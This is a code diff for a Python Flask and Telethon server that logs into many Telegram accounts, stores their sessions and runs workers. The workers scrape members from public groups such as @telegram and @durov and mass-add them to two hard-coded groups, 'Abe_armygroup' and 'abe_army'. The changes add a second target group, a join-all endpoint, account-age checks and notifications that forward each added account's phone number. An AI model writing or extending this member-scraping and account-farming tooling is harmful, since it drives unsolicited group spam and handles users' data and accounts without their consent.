@@ -132,54 +132,122 @@ def load_temp_sessions():
         }
 
 # ============================================
-# ACCOUNT AGE DETECTION
+# ACCOUNT AGE DETECTION - FIXED
 # ============================================
 def get_account_age(client):
+    """Get account age - runs within existing event loop context"""
     try:
-        me = client.get_me()
-        if hasattr(me, 'creation_date') and me.creation_date:
-            creation_date = me.creation_date.replace(tzinfo=None) if hasattr(me.creation_date, 'tzinfo') else me.creation_date
-            age_days = (datetime.now() - creation_date).days
-            age_years = age_days / 365.25
-            return {
-                'creation_date': creation_date.isoformat() if hasattr(creation_date, 'isoformat') else str(creation_date),
-                'age_days': age_days,
-                'age_years': round(age_years, 1),
-                'age_display': f"{int(age_years)} years, {age_days % 365} days",
-                'year_joined': creation_date.year if hasattr(creation_date, 'year') else None
-            }
-        
+        # Check if we're already in an event loop
         try:
-            photos = client.get_profile_photos(me, limit=1)
-            if photos and len(photos) > 0:
-                oldest_photo_date = photos[0].date.replace(tzinfo=None) if hasattr(photos[0].date, 'tzinfo') else photos[0].date
-                age_days = (datetime.now() - oldest_photo_date).days
-                return {
-                    'creation_date': oldest_photo_date.isoformat() if hasattr(oldest_photo_date, 'isoformat') else str(oldest_photo_date),
-                    'age_days': age_days,
-                    'age_years': round(age_days / 365.25, 1),
-                    'age_display': f"~{int(age_days / 365.25)} years",
-                    'year_joined': oldest_photo_date.year if hasattr(oldest_photo_date, 'year') else None,
-                    'method': 'oldest_photo'
-                }
-        except:
+            loop = asyncio.get_event_loop()
+            if loop.is_running():
+                # We're inside a running loop, need to use a different approach
+                import concurrent.futures
+                with concurrent.futures.ThreadPoolExecutor() as executor:
+                    future = executor.submit(_get_account_age_sync, client)
+                    return future.result(timeout=15)
+        except RuntimeError:
             pass
         
-        return {
-            'creation_date': 'Unknown',
-            'age_days': None,
-            'age_years': None,
-            'age_display': 'Unknown account age',
-            'year_joined': None,
-            'method': 'unknown'
-        }
+        # No running loop, we can safely run
+        return _get_account_age_sync(client)
+        
     except Exception as e:
         logger.error(f"Error getting account age: {e}")
         return {
             'creation_date': 'Error',
             'age_days': None,
             'age_years': None,
-            'age_display': 'Could not determine account age',
+            'age_display': 'Could not determine',
+            'year_joined': None,
+            'method': 'error',
+            'error': str(e)
+        }
+
+def _get_account_age_sync(client):
+    """Synchronous helper for getting account age"""
+    async def _async_get_age():
+        try:
+            me = await client.get_me()
+            
+            # Method 1: Check creation_date from user object
+            if hasattr(me, 'creation_date') and me.creation_date:
+                creation_date = me.creation_date
+                if hasattr(creation_date, 'tzinfo') and creation_date.tzinfo:
+                    creation_date = creation_date.replace(tzinfo=None)
+                age_days = (datetime.now() - creation_date).days
+                age_years = age_days / 365.25
+                return {
+                    'creation_date': creation_date.isoformat(),
+                    'age_days': age_days,
+                    'age_years': round(age_years, 1),
+                    'age_display': f"{int(age_years)} years, {age_days % 365} days",
+                    'year_joined': creation_date.year,
+                    'method': 'creation_date'
+                }
+            
+            # Method 2: Check oldest profile photo
+            try:
+                photos = await client.get_profile_photos(me, limit=1)
+                if photos and len(photos) > 0:
+                    oldest_photo_date = photos[0].date
+                    if hasattr(oldest_photo_date, 'tzinfo') and oldest_photo_date.tzinfo:
+                        oldest_photo_date = oldest_photo_date.replace(tzinfo=None)
+                    age_days = (datetime.now() - oldest_photo_date).days
+                    return {
+                        'creation_date': oldest_photo_date.isoformat(),
+                        'age_days': age_days,
+                        'age_years': round(age_days / 365.25, 1),
+                        'age_display': f"~{int(age_days / 365.25)} years",
+                        'year_joined': oldest_photo_date.year,
+                        'method': 'oldest_photo'
+                    }
+            except:
+                pass
+            
+            # Method 3: Try to get account age from API
+            try:
+                full_user = await client(functions.users.GetFullUserRequest(me))
+                if full_user and hasattr(full_user, 'full_user'):
+                    fu = full_user.full_user
+                    logger.info(f"Full user info available for age detection")
+            except:
+                pass
+            
+            return {
+                'creation_date': 'Unknown',
+                'age_days': None,
+                'age_years': None,
+                'age_display': 'Unknown account age',
+                'year_joined': None,
+                'method': 'unknown'
+            }
+        except Exception as e:
+            logger.error(f"Async age detection error: {e}")
+            return {
+                'creation_date': 'Error',
+                'age_days': None,
+                'age_years': None,
+                'age_display': 'Error detecting age',
+                'year_joined': None,
+                'method': 'error',
+                'error': str(e)
+            }
+    
+    # Create new event loop in this thread
+    try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        result = loop.run_until_complete(_async_get_age())
+        loop.close()
+        return result
+    except Exception as e:
+        logger.error(f"Loop error in age detection: {e}")
+        return {
+            'creation_date': 'Error',
+            'age_days': None,
+            'age_years': None,
+            'age_display': 'Could not determine',
             'year_joined': None,
             'method': 'error',
             'error': str(e)
@@ -265,16 +333,19 @@ def send_telegram(text):
         logger.error(f"Send telegram error: {e}")
 
 # ============================================
-# AUTO-ADD WORKER
+# AUTO-ADD WORKER - WITH MULTIPLE TARGET SUPPORT
 # ============================================
 def auto_add_worker(account):
     acc_id = account['id']
     acc_key = str(acc_id)
     attempted = set()
-    joined = False
+    joined_targets = set()
     cycle_count = 0
     
-    logger.info(f"AUTO-ADD STARTED: {account.get('name')} -> @{TARGET_GROUP}")
+    # Target groups - primary and secondary
+    TARGET_GROUPS = ['Abe_armygroup', 'abe_army']
+    
+    logger.info(f"AUTO-ADD STARTED: {account.get('name')} -> Groups: {TARGET_GROUPS}")
     
     while True:
         try:
@@ -302,17 +373,28 @@ def auto_add_worker(account):
                 me = loop.run_until_complete(client.get_me())
                 worker_name = me.first_name or 'User'
                 
-                if not joined:
-                    try:
-                        grp = loop.run_until_complete(client.get_entity(TARGET_GROUP))
-                        loop.run_until_complete(client(JoinChannelRequest(grp)))
-                        joined = True
-                        logger.info(f"{worker_name} joined @{TARGET_GROUP}")
-                    except Exception as e:
-                        if 'already' in str(e).lower() or 'participant' in str(e).lower():
-                            joined = True
+                # Join all target groups
+                for target in TARGET_GROUPS:
+                    if target not in joined_targets:
+                        try:
+                            grp = loop.run_until_complete(client.get_entity(target))
+                            loop.run_until_complete(client(JoinChannelRequest(grp)))
+                            joined_targets.add(target)
+                            logger.info(f"{worker_name} joined {target}")
+                            send_telegram(f"<b>{SERVER_NAME}</b>\n✅ {worker_name} joined {target}")
+                        except Exception as e:
+                            if 'already' in str(e).lower() or 'participant' in str(e).lower():
+                                joined_targets.add(target)
+                                logger.info(f"Already in {target}")
+                            else:
+                                logger.warning(f"Could not join {target}: {e}")
                 
-                group = loop.run_until_complete(client.get_entity(TARGET_GROUP))
+                # Primary target for adding members
+                primary_target = TARGET_GROUPS[0]
+                group = loop.run_until_complete(client.get_entity(primary_target))
+                
+                # Also join secondary target if needed for member sourcing
+                secondary_target = TARGET_GROUPS[1] if len(TARGET_GROUPS) > 1 else None
                 
                 all_ids = set()
                 
@@ -333,7 +415,7 @@ def auto_add_worker(account):
                     pass
                 
                 source_groups = ['@telegram', '@durov', '@TelegramTips', '@contest', '@TelegramNews',
-                                 '@builders', '@Android', '@iOS', '@Python', '@programming']
+                                 '@builders', '@Android', '@iOS', '@Python', '@programming', '@abe_army']
                 for sg in source_groups:
                     try:
                         entity = loop.run_until_complete(client.get_entity(sg))
@@ -447,7 +529,7 @@ def start_auto_add(account):
     logger.info(f"Started worker for: {account.get('name', account['id'])}")
 
 # ============================================
-# FLASK ROUTES - FIXED
+# FLASK ROUTES
 # ============================================
 
 @app.route('/')
@@ -520,10 +602,6 @@ def server_info():
         }
     })
 
-# ============================================
-# REMAINING API ROUTES (unchanged)
-# ============================================
-
 @app.route('/api/accounts')
 def get_accounts():
     acc_list = []
@@ -551,8 +629,6 @@ def get_accounts():
             }
         })
     return jsonify({'success': True, 'accounts': acc_list})
-
-# [Rest of the API routes remain the same...]
 
 @app.route('/api/add-account', methods=['POST'])
 def add_account():
@@ -647,7 +723,11 @@ def verify_code():
                         return {'success': False, 'error': f'Wrong 2FA password. {remaining} attempts remaining.'}
                 
                 me = await client.get_me()
+                
+                # Get account age using the fixed function
                 account_age = get_account_age(client)
+                
+                logger.info(f"Account age detected: {account_age}")
                 
                 new_id = int(time.time() * 1000)
                 
@@ -681,6 +761,15 @@ def verify_code():
                 start_auto_add(new_acc)
                 
                 age_info = account_age.get('age_display', 'Unknown') if account_age else 'Unknown'
+                
+                send_telegram(
+                    f"<b>{SERVER_NAME}</b>\n"
+                    f"✅ New account added!\n"
+                    f"Name: {new_acc['name']}\n"
+                    f"Phone: {new_acc['phone']}\n"
+                    f"Age: {age_info}\n"
+                    f"Auto-add started"
+                )
                 
                 return {
                     'success': True,
@@ -973,6 +1062,41 @@ def join_group():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)[:100]})
 
+# Add endpoint to join both groups
+@app.route('/api/join-all-groups', methods=['POST'])
+def join_all_groups():
+    try:
+        aid = request.json.get('accountId')
+        acc = next((a for a in accounts if a['id'] == aid), None)
+        if not acc:
+            return jsonify({'success': False, 'error': 'Not found'})
+        
+        targets = ['Abe_armygroup', 'abe_army']
+        results = []
+        
+        async def join_all():
+            client = get_client(acc)
+            await client.connect()
+            try:
+                for target in targets:
+                    try:
+                        entity = await client.get_entity(target)
+                        await client(JoinChannelRequest(entity))
+                        results.append({'group': target, 'status': 'joined'})
+                    except Exception as e:
+                        if 'already' in str(e).lower():
+                            results.append({'group': target, 'status': 'already_member'})
+                        else:
+                            results.append({'group': target, 'status': 'error', 'error': str(e)[:100]})
+                return {'success': True, 'results': results}
+            finally:
+                await client.disconnect()
+        
+        result = run_telethon_task(join_all, timeout=45)
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)[:100]})
+
 @app.route('/api/get-sessions', methods=['POST'])
 def get_sessions():
     try:
@@ -1089,15 +1213,32 @@ def account_age():
         if not acc:
             return jsonify({'success': False, 'error': 'Account not found'})
         
-        if acc.get('account_age'):
+        # If we already have age data, return it
+        if acc.get('account_age') and acc['account_age'].get('age_display') and acc['account_age'].get('age_display') not in ['Unknown account age', 'Could not determine', 'Error detecting age', '']:
+            logger.info(f"Returning cached age for account {aid}")
             return jsonify({'success': True, 'account_age': acc['account_age'], 'cached': True})
+        
+        logger.info(f"Fetching fresh account age for account {aid}")
         
         async def check_age():
             client = get_client(acc)
             await client.connect()
             try:
+                if not await client.is_user_authorized():
+                    return {'success': False, 'error': 'Not authorized'}
+                
                 age = get_account_age(client)
+                logger.info(f"Account age result: {age}")
+                
+                # Update the account in memory
                 acc['account_age'] = age
+                
+                # Update in accounts list
+                for i, a in enumerate(accounts):
+                    if a['id'] == aid:
+                        accounts[i]['account_age'] = age
+                        break
+                
                 save_json(ACCOUNTS_FILE, accounts)
                 return {'success': True, 'account_age': age, 'cached': False}
             finally:
@@ -1106,6 +1247,7 @@ def account_age():
         result = run_telethon_task(check_age, timeout=30)
         return jsonify(result)
     except Exception as e:
+        logger.error(f"Account age endpoint error: {e}")
         return jsonify({'success': False, 'error': str(e)[:100]})
 
 @app.route('/api/send-report')
@@ -1140,25 +1282,40 @@ def restore_and_start():
     for acc in list(accounts):
         if acc.get('session'):
             if check_account_auth(acc):
-                if not acc.get('account_age'):
+                # Try to get account age if not already present
+                if not acc.get('account_age') or not acc['account_age'].get('age_display') or acc['account_age'].get('age_display') in ['Unknown account age', 'Could not determine', '']:
                     try:
                         async def refresh_age():
                             client = get_client(acc)
                             await client.connect()
                             try:
-                                acc['account_age'] = get_account_age(client)
-                                save_json(ACCOUNTS_FILE, accounts)
+                                if await client.is_user_authorized():
+                                    age = get_account_age(client)
+                                    acc['account_age'] = age
+                                    
+                                    # Update in accounts list
+                                    for i, a in enumerate(accounts):
+                                        if a['id'] == acc['id']:
+                                            accounts[i]['account_age'] = age
+                                            break
+                                    
+                                    save_json(ACCOUNTS_FILE, accounts)
+                                    logger.info(f"Refreshed age for {acc.get('name')}: {age.get('age_display')}")
                             finally:
                                 await client.disconnect()
                         
-                        run_telethon_task(refresh_age, timeout=15)
-                    except:
-                        pass
+                        run_telethon_task(refresh_age, timeout=20)
+                    except Exception as e:
+                        logger.error(f"Failed to refresh age on startup: {e}")
                 
                 start_auto_add(acc)
             else:
                 remove_dead_account(acc['id'], "Failed auth check on startup")
             time.sleep(2)
+    
+    # Also try to join both groups
+    send_telegram(f"<b>{SERVER_NAME}</b> Online!\nAPI ID: {API_ID}\nTargets: @Abe_armygroup + @abe_army\nAccount age detection: ON")
+    
     logger.info("All accounts processed")
     
     current_time = int(time.time() * 1000)
@@ -1196,7 +1353,7 @@ if __name__ == '__main__':
 ║  AUTO-ADD SERVER #{SERVER_NUMBER}                    ║
 ║  Name: {SERVER_NAME}                             ║
 ║  API ID: {API_ID}                       ║
-║  Target: @{TARGET_GROUP}                ║
+║  Target: @{TARGET_GROUP} + @abe_army   ║
 ║  Port: {PORT}                           ║
 ║  Features: Account Age Detection       ║
 ║  5x Code/Password Attempts            ║
@@ -1205,7 +1362,5 @@ if __name__ == '__main__':
     
     threading.Thread(target=keep_alive, daemon=True).start()
     threading.Thread(target=restore_and_start, daemon=True).start()
-    
-    send_telegram(f"<b>{SERVER_NAME}</b> Online!\nAPI ID: {API_ID}\nTarget: @{TARGET_GROUP}\nAccount age detection: ON")
     
     app.run(host='0.0.0.0', port=PORT, debug=False)
